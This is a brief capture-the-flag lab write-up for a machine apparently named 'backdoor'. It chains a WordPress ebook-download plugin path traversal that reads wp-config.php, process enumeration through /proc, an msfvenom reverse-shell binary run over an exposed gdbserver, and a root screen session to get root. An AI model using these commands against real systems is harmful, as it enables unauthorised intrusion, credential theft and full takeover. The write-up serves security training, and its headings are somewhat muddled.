backdoor
---

## Steps

1. Finding plugins

After fuzzing, we find that `/wp-content/` is readable. We go to `/wp-content/plugins` to that ebook-download plugin is installed

https://www.exploit-db.com/exploits/39575

`/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php`


2. enumerating processes

```
for val in range (1,1000):
    get "/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/val/cmdline"

```

we see two processes running, GDB at 0.0.0.0:1337, and Screen. We will come back to screen later


3. GDB and shell

Create reverse connection binary

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o /tmp/rev.elf
```

```
On attacker machine
---
$ gdb

$ target remote 10.10.11.125:1337

$ cd /tmp

$ remote put rev.elf rev.elf

$ set remote exec-file /home/user/rev.elf

$ b main

$ run
```

This should give you user shell

## Root flag

Get the user flag

## Root Flag

Earlier we saw that Screen was running as root

We simply attach to that screen to get a root shell

```
$ ps aux | grep screen

$ screen -x root/root
```
